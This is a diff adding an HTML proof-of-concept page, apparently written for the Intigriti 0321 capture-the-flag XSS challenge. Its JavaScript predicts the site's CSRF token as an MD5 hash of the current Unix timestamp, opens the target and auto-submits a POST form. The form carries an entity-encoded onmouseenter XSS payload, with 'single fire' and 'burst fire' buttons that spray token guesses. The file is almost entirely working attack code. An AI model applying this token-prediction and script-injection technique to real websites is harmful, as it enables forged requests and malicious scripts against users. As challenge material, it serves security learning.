@@ -1,0 +1,63 @@
+<html>
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+        <!-- Bootstrap CSS -->
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    
+        <title>Hello, world!</title>
+      </head>
+  <body>
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.18.0/js/md5.min.js" integrity="sha512-Hmp6qDy9imQmd15Ds1WQJ3uoyGCUz5myyr5ijainC1z+tP7wuXcze5ZZR3dF7+rkRALfNy7jcfgS5hH8wJ/2dQ==" crossorigin="anonymous"></script>
+<script>
+        var w;
+        let counter = 0;
+        
+        let sleep = (ms) => {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        } 
+        async function burst() {
+            let csrftoken = document.getElementById("csrfToken");
+                for (i=0; i<5;i++){
+                    w = window.open("https://challenge-0321.intigriti.io/", "myWindow", "width=500,height=500");
+                    await sleep(250);
+                    let hash =md5(Math.floor(Date.now() / 1000));
+                    csrftoken.value = hash;
+                    await sleep(250);
+                    xssForm.submit()
+                }
+        }
+        async function single() {
+            let csrftoken = document.getElementById("csrfToken");
+            w = window.open("https://challenge-0321.intigriti.io/", "myWindow", "width=500,height=500");
+            await sleep(250);
+            let hash =md5(Math.floor(Date.now() / 1000));
+            csrftoken.value = hash;
+            await sleep(250);
+            xssForm.submit()
+                
+        }
+        
+</script>
+    <div class="container">
+        <form name="xssForm" action="https://challenge-0321.intigriti.io/" method="POST" target="_blank">
+        <input id="csrfToken" type="hidden" name="csrf" value="" />
+        
+        <small class="lead" style="">Works best on chrome, multiple firing might require usually</small><br>
+        <input type="text" style="height:10vh;width:100%" name="notes" value="&quot;onmouseenter&#61;alert&#40;&apos;flag&#123;THIS_IS_THE_FLAG&#125;&apos;&#41;&#59;&quot;&#64;x&#46;gg1" />
+        <input type="hidden" value="Submit request" />
+
+        <small class="text-muted" style="color:red;">Single fire , fires one time but it has a chance that it could miss csrf token</small><br>
+        <small class="text-muted" style="color:red;">Burst fire , fires 5times , guarantee at least one working shot out of five beacuse it spray csrftoken.</small>
+        </form>
+        
+        <button class="btn btn-success" onclick="single()">SINGLE FIRE</button>
+        <button class="btn btn-secondary" onclick="burst()">BURST FIRE</button>
+    </div>
+  </body>
+</html>
